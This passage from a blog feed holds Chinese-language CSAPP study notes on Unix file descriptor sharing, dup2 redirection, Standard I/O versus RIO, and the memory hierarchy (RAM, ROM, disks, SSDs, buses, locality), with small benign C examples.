File Table 它们指向<strong>同一个物理文件（也就是同一个 v-Node Table）</strong>，但他们本身不一定完全相同，因为它们的字段 <strong><code>File pos</code> 是分别由各个打开进程维护的</strong>。</p><p><strong>这意味着程序调用了两次 <code>open</code>，但是参数是同一个 filename</strong>（再次强调：<strong>可能在不同的进程中，而且 <code>File pos</code> 不一定相同</strong>），如下图：</p></li></ol><p><img src="imgs/fd_same_open.png" height="300px"></p><ol><li><p>允许一个 v-Node Table 不被任何 Open File Table 指向。</p><p><strong>这意味着这个物理文件还没有被程序的任何进程打开过</strong>。</p></li></ol></blockquote></li><li><p>每个 Open File Table 的第二个字段是 <code>refcnt</code>（reference count，引用计数），这个字段表明这个 Open File Table 被描述符表中的多少个 entry 指向；</p><blockquote><p>为什么要有这项数据？</p><p>因为在程序中，可能出现多进程（尤其是 <code>fork()</code> 产生）共享文件资源的情况，这时 OS 需要追踪内存分配，如果程序结束时，OS 需要回收这些部分（引用次数为 0 时不会立即清除）。堆的内存管理也有这种机制，不过比这个复杂很多。</p></blockquote></li></ul><p>有个相当重要的点，回忆一下，之前讨论 <code>fork</code> 的时候提到，创建的子进程总是可以直接继承使用父进程的文件描述符，达到二者共享文件资源的目的。但是，之前说描述符表是由每个进程的 OS Kernel 单独维护的。</p><p>那么这样的情况下，父子进程共享的文件资源是如何实现的？如下图过程：</p><p><img src="imgs/file_sharing_before.png" height="300px"></p><p><img src="imgs/file_sharing_after.png" height="300px"></p><p>总结一下父子进程共享文件描述符的要点：</p><ul><li>子进程<strong>完全复制</strong>父进程的描述符表；</li><li>父进程描述符表中指向的所有文件表的引用计数各加 1；</li></ul><p>因此我们得知，<strong>父子进程共享的不是物理文件，而是 Open File Tables</strong>（共用了文件指针）；这意味着父子进程任意一方读写文件，二者的文件指针一起变化；</p><p>⚠ <strong>最重要的是，每个进程都必须显式调用 <code>close</code>（除了 0、1、2 号文件），才能最终使引用计数为 0，操作系统才能回收。</strong></p><h3 id="14-5-3-I-O-Redirection"><a href="#14-5-3-I-O-Redirection" class="headerlink" title="14.5.3 I/O Redirection"></a>14.5.3 I/O Redirection</h3><p>再思考一个问题，Unix Shell 是如何实现 I/O 管道流和重定向的功能的呢？实际上，这个功能的实现也与文件描述符表有关。我们以一个例子为例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> &gt; foo.txt</span><br></pre></td></tr></table></figure><p>这个指令将 <code>ls</code> 命令输出的结果重定向到 <code>foo.txt</code> 文件中，实际在 shell 的源码中应该使用了一个特殊的系统级函数（再次提示，系统级函数是<strong>系统调用的封装</strong>）：<code>dup2</code>；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">dup2</span><span class="params">(<span class="type">int</span> oldfd, <span class="type">int</span> newfd)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* More: */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dup</span><span class="params">(<span class="type">int</span> oldfd)</span>;    <span class="comment">/* uses the lowest-numbered unused descriptor for the new descriptor. */</span></span><br></pre></td></tr></table></figure><ul><li>作用：<strong>先将描述符为 <code>newfd</code> 的文件关闭以释放资源，再将描述符为 <code>oldfd</code> 的 descriptor table entry 复制到指定描述符为 <code>newfd</code> 的 entry 中</strong>；<ul><li>⚠ 如果 <code>oldfd</code> 是无效的描述符（即 descriptor table 在该位置的 entry 不指向有效的 open file table），则 <code>dup2</code> 执行错误，<strong>这个时候 <code>newfd</code> 对应的资源不会关闭</strong>；</li><li>⚠ 如果 <code>oldfd</code> 是有效的描述符，但是 <code>newfd == oldfd</code>，<strong>那么 <code>dup2</code> 什么都不会做，直接返回 <code>newfd</code></strong>;</li></ul></li><li>返回值：如果正确执行，则返回更新后的 <code>newfd</code>；如果执行错误，则返回 <strong>-1</strong> 并且设置 <code>errno</code>；</li></ul><p>切记，这条指令相当危险，除非你是在设计与操作系统层级很近的应用程序（例如 shell），否则不用轻易使用它，因为它能轻易将你绕晕，不知道哪些文件还没有释放。</p><h3 id="14-5-4-Standard-I-O"><a href="#14-5-4-Standard-I-O" class="headerlink" title="14.5.4 Standard I/O"></a>14.5.4 Standard I/O</h3><p>这里的库是 C standard library 包装的一些更高层级的 I/O 接口，它和之前我们接触到的 Unix I/O、RIO 的关系如下：</p><p><img src="imgs/IO_interface.png"></p><p>这些标准 I/O 实际上是 C 的一部分。先归一归类，大家都比较熟悉了：</p><ul><li>Opening and closing files（<code>fopen</code>、<code>fclose</code>）；</li><li>Reading and writing files（<code>fread</code>、<code>fwrite</code>）；</li><li>Reading and writing text files（<code>fgets</code>、<code>fputs</code>）；</li><li>Formatted reading and writing（<code>fscanf</code>、<code>fprintf</code>）；</li></ul><p>不仅如此，你见到的很多 standard I/O 都带有 buffering，所以规避了很多低层级的操作。</p><p>那么 standard I/O 的 buffer 和 RIO 的 buffer 有什么不同呢？</p><p><strong>在功能上</strong>，standard I/O 对于终端文件（terminal）或普通文件的访问方面包装显然要远远优于 RIO；但是 standard I/O 没有考虑到一些网络套接字方面的细节和小问题，所以在<strong>网络套接字的读写方面</strong>用起来还是 RIO 更胜一筹。</p><p><strong>在 buffer 设计上</strong>，standard I/O buffer 有一套 <strong>flush 机制</strong>。</p><p>对于写的情况，standard I/O 的 buffer 仅当出现以下情况之一时，才将 buffer 整体写入 Unix file，这么做可以减少系统调用次数，提升程序性能：</p><ul><li>标准输出函数（<code>fprintf/sprintf/...</code>）的结尾含有 <code>\n</code> 换行（<strong>换行结尾</strong>）；</li><li>Standard I/O 内部的 buffer 已经写满（<strong>缓冲占满</strong>）；</li><li>执行标准输出函数的进程从 <code>main</code> 函数退出了（<strong>程序结束</strong>）；</li><li>程序显式地调用 <code>fflush(FILE*)</code> 刷新缓冲区（<strong>手动刷新</strong>）；</li></ul><p>而 RIO 设定了固定大小的 buffer，并根据用户输入的读取或写入的大小分次进行系统调用，二者各有利弊。</p><p>综上，RIO 比 standard I/O 更适宜用在网络套接字读写方面，而 standard I/O 则在其他大部分文件读写的情况下表现更加优秀。</p><h2 id="14-6-Summary-of-System-I-O"><a href="#14-6-Summary-of-System-I-O" class="headerlink" title="14.6 Summary of System I/O"></a>14.6 Summary of System I/O</h2><p>本章开始，我们介绍了 Unix File 的概念和常见类型。对于 Unix File 的基本操作，则被操作系统抽象成了 Unix I/O（有系统级函数、系统调用），这些操作非常底层，不过有优势也有劣势：</p><ul><li>Pros<ul><li>Unix I/O 是<strong>最通用、开销最小的 I/O 接口形式</strong>（其他所有 I/O 库都基于此）；</li><li>Unix I/O 提供了一系列访问文件 metadata 的函数（<code>stat</code>、<code>fstat</code>）；</li><li>⚠ <strong>重大优点：它们都是 异步信号安全 的，可以用在 signal handlers 中</strong>；</li></ul></li><li>Cons<ul><li>应对 short counts 的处理很麻烦（尤其是应对 <code>EINTR</code> 和网络传输时），容易出错；</li><li>想要按照文本行读取出一行也很麻烦，也易错；</li></ul></li></ul><p>Standard I/O 非常优秀，同样有它的优缺点：</p><ul><li>Pros<ul><li>使用特殊的 buffer 机制，减少了系统调用的访问次数；</li><li>自动解决 short counts 的异常问题；</li></ul></li><li>Cons<ul><li>不提供访问文件元信息的接口；</li><li>其中的函数几乎<strong>都不是</strong>异步信号安全的函数；</li><li>不适宜用在读写网络套接字上，很容易出错；</li></ul></li></ul><p>最后，根据各个 I/O 的封装特性和抽象层级，我们可以总结出这些 I/O 库的选择注意事项 和 推荐：</p><p><strong>⚠ 注意事项 ⚠</strong></p><ol><li><p><strong>在条件允许的情况下，尽可能使用抽象层级高的 I/O 库</strong>；</p><blockquote><p>这样可以避免一些诸如 <code>EINTR</code>（之前提到，这个系统错误码是因为运气不好，重新调用一次就能修复）等底层奇奇怪怪的信息或错误；</p></blockquote></li><li><p><strong>使用 I/O 库的接口前，一定弄清楚接口的具体作用和逻辑</strong>；</p><ul><li><p>例如<strong>读二进制文件不能用 识别文本信息 的接口</strong>（例如用 <code>rio_readlineb</code> 去读图片、用 <code>strlen/strcpy</code> 去操作 socket 数据）；</p><blockquote><p>因为大多数识别文本信息的接口，尤其是按行输入的，会识别文本中的换行符（<code>0xa</code> 或 <code>0xd 0xa</code>，即 <code>EOL</code>，end of line），并以此分割读入；</p><p>不仅如此，它们还会把 byte value 0 解释为文本结束（end of string），这样会导致读入操作提前结束。而 <code>0x0</code> 只不过是二进制数据中一个数据而已，只有字符串是以 0 结尾的。</p></blockquote></li></ul></li><li><p><strong>Standard I/O 和 RIO 不应该混合使用！因为二者内部维护的 buffer 不同，在运行中可能出现干扰和错误</strong>；</p></li></ol><p><strong>ℹ 使用建议 ℹ</strong></p><ol><li>当 I/O 操作的对象是 <strong>disk / terminal files</strong> 的时候，使用 Standard I/O 最佳；</li><li>当需要一些尽量底层的操作（例如写 signal handlers 时），或者极其需要程序性能的时候（少见），使用 raw I/O（Unix I/O）；</li><li>当 I/O 操作的对象是网络 socket 文件时，最好使用 RIO 来处理一些特殊的情况，例如 <code>EINTR</code> 和针对网络的 short counts 的处理；</li></ol><hr><p>补充知识：操作目录文件</p><p><strong>唯一推荐对 directory 的操作：打开、读取 entries</strong>；</p><p>看下面的这个例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    DIR *directory;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">de</span>;</span></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    <span class="keyword">if</span> (!(directory = opendir(dir_name)))</span><br><span class="line">        error(<span class="string">&quot;Failed to open directory&quot;</span>);</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">0</span> != (de = readdir(directory))) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Found file: %s\n&quot;</span>, de-&gt;d_name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    closedir(directory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Chapter-13-Exceptional-Control-Flow&quot;&gt;&lt;a href=&quot;#Chapter-13-Exceptional-Control-Flow&quot; class=&quot;headerlink&quot; title=&quot;Chapter 13. Exceptiona</summary>
      
    
    
    
    <category term="review" scheme="https://blog.sjtuxhw.top/categories/review/"/>
    
    
    <category term="GNU" scheme="https://blog.sjtuxhw.top/tags/GNU/"/>
    
    <category term="CSAPP" scheme="https://blog.sjtuxhw.top/tags/CSAPP/"/>
    
    <category term="ICS" scheme="https://blog.sjtuxhw.top/tags/ICS/"/>
    
    <category term="Programming" scheme="https://blog.sjtuxhw.top/tags/Programming/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Notes: Memory Hierarchy &amp; Cache &amp; Opt</title>
    <link href="https://blog.sjtuxhw.top/review/csapp-mm-cache/"/>
    <id>https://blog.sjtuxhw.top/review/csapp-mm-cache/</id>
    <published>2024-04-10T02:01:25.000Z</published>
    <updated>2024-10-25T13:54:29.580Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Chapter-10-The-Memory-Hierarchy"><a href="#Chapter-10-The-Memory-Hierarchy" class="headerlink" title="Chapter 10. The Memory Hierarchy"></a>Chapter 10. The Memory Hierarchy</h1><blockquote><p>本章将介绍系统的内存分层架构。</p></blockquote><p>之前几章，我们对于内存的理解就是一个很大的字节数组，可以用地址作为下标进行访问。但事实上，真正的计算机的存储系统背后的设备层次结构设计远比这层抽象要复杂。</p><p>正是计算机的存储系统的层次结构对有限、离散资源的管理和抽象，才能让程序的内存看起来呈现出这种线性的数组结构。本章就来讨论计算机存储系统背后的层次结构。</p><h2 id="10-1-Storage-Technologies-amp-Trends"><a href="#10-1-Storage-Technologies-amp-Trends" class="headerlink" title="10.1 Storage Technologies &amp; Trends"></a>10.1 Storage Technologies &amp; Trends</h2><p>在正式学习存储系统的层次结构前，有必要稍微弄清楚底层硬件的情况。</p><h3 id="10-1-1-Random-Access-Memory-RAM"><a href="#10-1-1-Random-Access-Memory-RAM" class="headerlink" title="10.1.1 Random-Access Memory (RAM)"></a>10.1.1 Random-Access Memory (RAM)</h3><p>当前大多数人所熟知的 “内存” 的一部分就是<strong>随机访问存储器（RAM）</strong>，它具有以下的特征：</p><ul><li><p>RAM 是个存储元件，I/O 吞吐速率快于绝大多数硬盘固件/磁盘（称为 “外存”）；</p></li><li><p>RAM 常常被打包放在 CPU 芯片中；</p></li><li><p>RAM 中每一个基本的存储单元被称为 <strong>单元胞</strong>（Cell），一个单元胞中存放 1 bit 数据；</p></li><li><p>很多个 RAM 芯片共同工作，组成了计算机的 <strong>主存</strong>（主存储器）。</p></li><li><p>RAM 分为 2 类，它们之间<strong>根据存储单元胞的实现方式来区分</strong>：</p><ul><li>SRAM（Static RAM），静态随机存储器；</li><li>DRAM（Dynamic RAM），动态随机存储器；</li></ul><table>    <tr>        <td></td>        <td>Trans. per bit</td>        <td>Access time</td>        <td>Needs refresh?</td>        <td>Needs EDC?</td>        <td>Cost</td>        <td>Applications</td>    </tr>    <tr>        <td>SRAM</td>        <td>4 or 6</td>        <td>1 ×</td>        <td>No</td>        <td>Maybe</td>        <td>100 ×</td>        <td>Cache Memories</td>    </tr>    <tr>        <td>DRAM</td>        <td>1</td>        <td>10 ×</td>        <td>Yes</td>        <td>Yes</td>        <td>1 ×</td>        <td>Main memories, frame buffers</td>    </tr></table><blockquote><p>注：<code>Trans. per bit</code> 表示每 bit 需要多少根晶体管，<code>EDC</code> 指电子数据捕获。</p><p>从上面这张表可以得知，SRAM 比 DRAM 成本高很多，因为 SRAM 的每个储存单元胞都更加复杂。正因如此，SRAM 的访问速度远远快于 DRAM，因此常被用在 Cache Memories（高速缓存器）中（成本也是高速缓存通常大小比较小的原因之一）。</p><p><strong>Needs EDC</strong> 的含义是指，必须用一定的电压作用在存储单元胞的两端，否则一断电就会丢失电荷，数据也会丢失（<strong>又称 Volatile Memories</strong>）。这也是 RAM 需要插电用的原因（当然，如果把它从电源上拔下后迅速扔进液氮中，可以保留其中数据，因为电荷散失速度可以忽略）。</p><p>DRAM 被广泛应用于主存、图形显卡的 <strong>帧缓存（frame buffer）</strong>中。</p></blockquote></li></ul><h3 id="10-1-2-Nonvolatile-Memories"><a href="#10-1-2-Nonvolatile-Memories" class="headerlink" title="10.1.2 Nonvolatile Memories"></a>10.1.2 Nonvolatile Memories</h3><p><strong>ROMs</strong></p><p>除了 RAM，计算机存储系统中另一类存储器是 <strong>非易失性存储器</strong>，它们在计算机断电后仍然能保存数据。请回忆数电中介绍的几种电子元件：</p><ul><li><strong>ROM</strong>（Read-Only Memory，只读存储器），出厂时就编程完成，通常电路烧在板子上不可更改；</li><li><strong>PROM</strong>（Programmable ROM，可编程只读存储器），只能对电路编程一遍；</li><li><strong>EPROM</strong>（Erasable PROM，可清除可编程只读存储器），可以被特殊作用清除电路信息（UV / X-rays）；</li><li><strong>EEPROM</strong>（Electrically Erasable PROM，电驱动可清除可编程只读存储器），可以使用电路、电子清除其中信息，但只能反复清除重写 100,000 次。</li></ul><blockquote><p>它们的电路结构想必各位脑海中都非常清楚对吧？</p></blockquote><p>其中，大家所熟知的 <strong>闪存（Flash Memory）</strong>，就是许多 EEPROM 元件组成的。</p><blockquote><p>Tips. 计算机存储系统中的<strong>主存</strong>包括了 <strong>ROM 和 RAM</strong>，但闪存作为 ROM 的一种，<strong>也是现代最常用的 ROM</strong>，也可以和机械硬盘一起被用在<strong>外存</strong>中。</p></blockquote><p>这些 ROM 的作用很广泛，主要有以下几个方面：</p><ul><li>普通 ROM <strong>常被用作重要的、不应该被更改的数据的存储</strong>，例如 BIOS（存储计算机系统启动时的指令 + boot 引导程序）、Controllers for disks（硬盘控制器）、Network Cards（网卡）、Graphics accelerator（图形加速器）、Security subsystem（安全子系统）；</li><li>它们（闪存）还会被用在 <strong>固态硬盘</strong>（SSD，Solid State Disk，代替转圈易坏的机械硬盘，用在笔记本电脑、手机、mp3 播放器、平板等设备，系统会把 SSD 看成机械硬盘）中；</li></ul><p><strong>机械硬盘</strong></p><p>除了 ROM 一类的非易失性存储器，还有 <strong>外存</strong>（外部存储器）也是非易失性存储器。我们这里介绍有代表性的机械硬盘：</p><ul><li><p>结构包括传动臂、SCSI 连接口、盘片、盘片轴……</p></li><li><p>硬盘中包含一系列盘片（platter），每个盘片有两个面，每个面上涂有磁性材料，并且存在一圈圈同心圆（concentric rings），被称为 <strong>磁道（tracks）</strong>，每个磁道包含若干 <strong>扇区（sectors）</strong>，扇区之间会有空隙间隔（gaps），<strong>一个扇区通常的大小是 512 bytes</strong>；</p><p><img src="imgs/disk_geometry.png" height="240px"></p><p>盘片轴（spindle）连接一系列盘片，<strong>每个盘片相同位置对齐的磁道称为 Aligned tracks，在垂直方向组成一个圆柱</strong>，这个相同位置的磁道所组成的元素称为 <strong>柱面</strong>，数据按照不同柱面进行存储，同一柱面的数据连续（为啥按柱面存？因为方便机械臂访问）。</p><p><img src="imgs/disk_geometry_multi_platter.png" height="240px"></p></li><li><p>传动臂悬浮在盘片上方，隔着一层薄薄的空气。其末端读写头可以感知编码位的磁场变化；</p></li><li><p>机械磁盘内置电子设备，用于控制传动臂的移动等操作，其驱动程序一般存于 ROM 中；</p></li><li><p>机械性质决定了机械硬盘的读写速率慢于 RAM 和 ROM；</p></li><li><p>硬盘承载量取决于 <strong>数据记录密度（recording density，1 inch 磁道段中能存放多少 bit 信息）、磁道密度（track density）、面密度（Areal density，前面二者的乘积）</strong>；</p></li></ul><blockquote><p>⚠ 易错点警告：对于硬盘来说，它的承载量单位 GB 是特殊的：<strong>1 GB = $10^9$ Bytes</strong>，这与之前我们见到的衡量二进制数据大小的单位 GiB（<strong>其简称也叫 GB，1 GiB = $2^{30}$ Bytes</strong>）是不一样的。</p><p>这么说就明白了：<strong>承载量单位应该分开来看</strong>：1 G | B，1 吉 (Giga) = $10^9$；</p><p>而<strong>衡量二进制数据大小的单位是个整体</strong>： 1 | GiB，GiB 本身是 gibibyte（giga-binary byte），是 byte 单位的 $2^{30}$ 倍；</p><p>最常见的是计网的考题：<strong>1 MB/s 在 1 s 内传输的数据量略小于 1 MB</strong>，因为承载量速率单位 1 MB/s 是 $10^6$ Bytes / s，而数据大小 1 MiB 是 $2^{20}=1024^2$ Bytes；</p></blockquote><ul><li><p>在很早以前的机械硬盘中，每个磁道的扇区数目固定，这会导致大量的空间浪费。所以现代的机械磁盘<strong>将许多磁道划分为一个个不相交子集，称为记录区（recording zones）</strong>：</p><ul><li>每个处于同一记录区中的磁道含有相同的扇区数，它取决于最内侧磁道；</li><li>每个记录区中的磁道的扇区数不同，越靠近内圈的记录区中磁道的扇区数越少；</li><li><strong>因此我们使用平均扇区数 / 磁道数来计算承载量</strong>；</li></ul><p>如下图，阴影部分为一个记录区，含有许多扇区数相同的磁道：</p><p><img src="imgs/recording_zone.png" height="200px"></p><blockquote><p>题型：计算磁盘承载量</p><p><strong>承载量 = 每个扇区的 byte 数（通常 512 bytes）× 一个磁道中平均扇区数 × 一个盘面中的磁道数 × 一个盘片上表面数目（对三维生物来说=2）× 每个磁盘的盘片数</strong>；</p></blockquote></li><li><p>机械硬盘借助悬浮在盘面上方的传动臂进行读取，许多传动臂在磁盘同一半径处读写，其搜索读取读取速度取决于三个因素：<strong>寻道时间（一般最长，大约 3~9 ms）、旋转延迟、传输时间</strong>。</p><p><img src="imgs/disk_op.png" height="200px"><img src="imgs/disk_access_time.png" height="200px"></p></li><li><p>关于数据访问的耗时，有一些数字可以了解一下：</p><ul><li><p>一般情况下机械硬盘的 <strong>寻道时间 &gt; 旋转延迟 ≈ 4 ms &gt;&gt; 传输时间</strong>；</p><blockquote><p>机械硬盘访问扇区的第一个 bit 耗时最多，其他几乎不耗时；</p></blockquote></li><li><p>SRAM 访问 8 bytes 数据平均需要 4 ns，DRAM 需要 60 ns，<strong>而机械磁盘比 SRAM 慢 40000 倍，比 DRAM 慢 2500 倍</strong>；</p></li></ul></li><li><p>硬盘（机械 / SSD）的<strong>逻辑块（Logical Disk Blocks）</strong>：现代硬盘提供了一个面向 CPU 的更简单的抽象。硬盘的可用扇区被抽象为一组 b-sized 的逻辑块（编号从 0 开始）；</p><ul><li><p>每个逻辑块是<strong>扇区大小的整数倍</strong>（跳过 gaps），最简单的情况下，一个逻辑块就是一个扇区；</p></li><li><p>磁盘控制器来保持从物理扇区到逻辑块之间的<strong>映射</strong>（间接层面、抽象层面）；</p><blockquote><p>这允许磁盘控制器保留一部分 <strong>柱面</strong>（前面提到的存储信息按照同心磁道组成的柱面） 不进行映射，作为 <strong>备用柱面</strong>。</p><p>当某一柱面上的一个扇区损坏，那么磁盘控制器可以直接将数据复制到备用柱面，然后磁盘就能继续正常工作。</p><p><strong>这就是为什么磁盘的 “格式容量”（formatted capacity）比实际容量小</strong>。</p></blockquote></li></ul></li></ul><p><strong>固态硬盘</strong></p><p>固态硬盘作为一种更新的、用来代替机械磁盘的外存形式，其控制器接口和机械磁盘一样，所以 CPU 一视同仁，不过它的速度介于 DRAM 和 机械硬盘之间。</p><p>其内部<strong>全部由闪存构建</strong>，并且由一个固件（firmware）称为闪存翻译层（<strong>flash translation layer</strong>）充当控制器（其作用和机械硬盘的磁盘控制器相当）；</p><p>数据在 SSD 中是以 <strong>页（page）</strong> 为单位从闪存中读取和写入的。页的大小 512 KB ~ 4 KB，块（block，和之前提到的 CPU 所认为的逻辑块<strong>不同</strong>，下面解释）一般包含 32 ~ 128 页，<strong>取决于 SSD 实现的技术</strong>；</p><blockquote><p>这里所说的 “块” 为啥和之前的 “逻辑块” 不同？</p><p>首先明确，这是个术语重叠的现象。这里的 SSD 中的 “块” 是闪存的性质导致的。目前技术下闪存的数据擦除是<strong>成块成块擦除</strong>，这意味着一次会同时擦除多个页。因此，人们把<strong>闪存一次擦除的一组页集合称为 “块”</strong>。</p><p>因此，想要修改某个块中的某个页，需要 <strong>将该块全部擦除（之前应该复制到其他位置）</strong> / <strong>找到一个已被擦除的块</strong> 才能写入；</p><p>现代的闪存翻译层中实现了很多专有算法，能够延长 SSD 的使用寿命，例如缓存技术。</p></blockquote><p><img src="imgs/ssd_struct.png" height=240></p><p>固态硬盘的读写效率大致是 <strong>随机访问 300 MB/s 左右，顺序访问 500 MB/s 左右</strong>（Intel SSD 730 的数据），可以说<strong>在计算机的存储系统的层次结构中，随机访问总是比顺序访问更耗时</strong>。其中 SSD 写入速度都略低于读取速度，这是因为闪存写入前需要擦除原先数据。总的来说，SSD 的访问速度大约比机械硬盘快 10 倍左右。</p><p>其实，SSD 和机械硬盘各有优劣，相较于机械硬盘，SSD 具有以下特征：</p><ul><li>（优势）没有机械移动，更快、耗能更低、更结实（较不易摔坏），适合用在便携设备中；</li><li>（劣势）可能磨损，但问题不大，一般生命周期中可以写 100 PB+ 的数据（足够用多年）；</li></ul><p>最后看一下各种存储介质和 CPU 时钟频率的关系：</p><p><img src="imgs/CPU_memory_gap.png" height="400px"></p><blockquote><p>2003 年，CPU 设计达到性能能源瓶颈，其发展从增大时钟频率转向增大 CPU 内核数。</p></blockquote><h3 id="10-1-3-Traditional-Bus-Structure-Connecting-CPU-and-Memory"><a href="#10-1-3-Traditional-Bus-Structure-Connecting-CPU-and-Memory" class="headerlink" title="10.1.3 Traditional Bus Structure Connecting CPU and Memory"></a>10.1.3 Traditional Bus Structure Connecting CPU and Memory</h3><p>说完计算机存储系统的硬件，那么它们是怎么与 CPU 建立连接，进而抽象出 “内存空间” 和 “存储空间” 的呢？</p><p><img src="imgs/io_bus.png" width="600px"></p><blockquote><p>其中 I/O 桥是另外的一些芯片组，另一些芯片的集合。</p></blockquote><p><strong>CPU 访问主存</strong></p><p>上面的图仅仅是比较简单粗略的抽象，不要较真。在比较老的计算机架构中（因为现代系统有专有的总线设计，非常复杂），采用 <strong>总线（bus）</strong>来连接 CPU 和主存的，数据通过总线在主存和 CPU 间来回传输。<strong>并且总线通常与其他多种设备共享</strong>。</p><p>正常情况下，CPU 中的 ALU 根据汇编机器指令只需访问最近的寄存器就行；如果指令要求它访问内存，那么 ALU 会交由总线接口（Bus Interface）去从主存中取出相应位置的数据。</p><p>大家可以思考一下，在上面这幅图中，<code>movq %rax, $A</code> （A 为内存地址）和 <code>movq $A, %rax</code> 应该如何形象表示？</p><p>大家不难发现，<strong>寄存器离 CPU 很近，所以访问速度很快</strong>，通常在 3 个时钟周期左右就能读写到值。但是内存（图中 Memory Devices 芯片组）离 CPU 相当远，中间的步骤相当多，所以<strong>对内存读写所消耗的时间大约是对寄存器读写耗时的 100 倍左右</strong>。这就是计算机内存系统引入所发现的其中一个性能损耗。</p><p><strong>CPU 访问外部设备（以外存: 磁盘为例）</strong></p><p>再来看 I/O 总线（I/O Bus），它将各个设备与 I/O 桥连接，<strong>使得外部设备能和主存一样被 CPU 访问</strong>。I/O Bus 看起来是一条线，可实际不是如此。因为在老式的计算机中，它被称为 PCI 总线（广播总线），主干连接到各个设备，任何设备只要更改其上的数据，其他设备就能发现。</p><p>但现代的 I/O 总线并不是一条线了，它采用了 PCI Express 的总线结构，并不像上面画的一样，它是 <strong>点对点地连接两个设备</strong>，实现不同（我们不会深入讨论），但提供的功能就像图上画的一样。所以可以把 I/O Bus 看作一组电子线路即可。</p><p>其中 Disk、Mouse、Keyboard、Monitor 等设备使用细双箭头，表示它们不是焊在主板上，而是插入主板上的控制器（adapter、controller）来连接。</p><p>考虑如果 CPU 想要访问某个磁盘设备的某个扇区，那么会进行如下步骤：</p><ul><li>CPU 生成一个三元组（triple）：<strong>指令</strong>（read / write）、<strong>逻辑块编号</strong>、该块中的数据要放到哪个<strong>内存地址</strong>中（CPU 先从磁盘读入内存，再从内存读入 CPU 寄存器，反方向亦然），并且当前线程的程序暂停执行（如果是 I/O 阻塞的话），等待数据传输；</li><li>三元组通过总线接口、I / O 桥、I / O 总线传给磁盘控制器；</li><li>磁盘控制器通过读取与该逻辑块对应的任何扇区（一个逻辑块可能包含很多扇区）读入磁盘缓存；</li><li>磁盘控制器取得总线控制权，并且<strong>将数据通过 I/O 总线、I/O 桥和内存总线直接送往指定内存地址，而无需将数据传给 CPU</strong>；</li><li>数据传输结束后，磁盘控制器借助 “I/O 总线 - I/O 桥” 从<strong>新的通路</strong>（不经过总线接口）直接用电信号触发 CPU 的某个<strong>引脚</strong>，这个信号代表一种<strong>中断（interrupt）</strong>，通知 CPU 该扇区已被复制，此时暂停的程序继续执行；</li></ul><h2 id="10-2-Locality"><a href="#10-2-Locality" class="headerlink" title="10.2 Locality"></a>10.2 Locality</h2><p>无论是 8.1.2 中介绍的各自存储介质在物理层面上的性能约束，还是 8.1.3 中介绍的数据读取流程上的性能限制，都是计算机存储系统需要解决的重要问题，否则，在硬件上计算机就难以继续提升运行速度了。</p><p>其实，弥补 CPU 和内外存读写速率之间差距的机制之一就是<strong>程序的基本属性之一：局部性（locality）</strong>。</p><p>局部性原则：程序倾向于使用 “<strong>内存地址接近或等于最近使用过的数据/指令地址的</strong>” 那些数据和指令。</p><blockquote><p>原文：Programs tend to use data and instructions with addresses near or equal to those they have used recently.</p></blockquote><p>这个原则来源于程序编写的逻辑——<strong>当程序访问到某个内存地址上的数据，那么在不久的将来，有很大的可能程序会访问该数据项或者附近的数据项</strong>。</p><p>这种局部性有两种表现形式：</p><ul><li><p>时间局部性（Temporal Locality）：最近引用的存储器位置可能在不久的将来再次被引用；</p></li><li><p>空间局部性（Spatial Locality）：如果访问了一个存储器的位置，那么有很大可能在将来会访问一个临近的位置；</p></li></ul><blockquote><p>例子：识别代码中的局部性</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line"> sum += a[i];</span><br><span class="line"><span class="keyword">return</span> sum;</span><br></pre></td></tr></table></figure><p>这串代码中，有对<strong>数据的引用</strong>（Data references，转为汇编后会引用数据，通常只要有变量就有数据的引用）。</p><p>例如上面的数组 <code>a</code>，其元素在内存上连续，索引 i 每自增一个单位就访问一下（称为 stride-1 reference pattern），属于空间局部性；上面的变量 <code>sum</code> 在循环的每次迭代中都会被引用，属于时间局部性；</p><p>还有对<strong>指令的引用（Instruction references）</strong>，例如循环中每一次都会执行循环体的内容，属于时间局部性；再比如程序代码顺序执行，本身就属于空间局部性。</p></blockquote><p>不同编写方法的代码，其局部性不同。这就需要开发者训练观看的能力。举一个很简单的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 